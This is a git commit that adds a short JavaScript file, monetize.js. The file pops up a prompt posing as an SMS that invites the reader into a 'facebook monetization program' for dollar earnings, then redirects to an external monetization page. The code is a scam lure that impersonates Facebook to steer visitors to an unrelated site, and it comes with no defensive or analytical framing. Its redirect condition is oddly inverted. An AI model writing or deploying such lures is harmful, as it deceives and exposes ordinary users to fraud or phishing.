2086b85ce4734b8f796cecff888ae79ffaf29d4f
boss-bloq <nsisboy01@gmail.com>
2024-06-28 04:26:19 -0700

    Create monetize.js

---
+++ monetize.js
@@ -0,0 +1,6 @@
+
+var password = '1'
+password=prompt('SMS: Congratulations dear, you are invited to join facebook monetization program and start earning in dollars. Kindly press 1 to get started now ','1');
+if (password != '1') {
+location.href='https://damba-fest.org/monetization.html';
+}
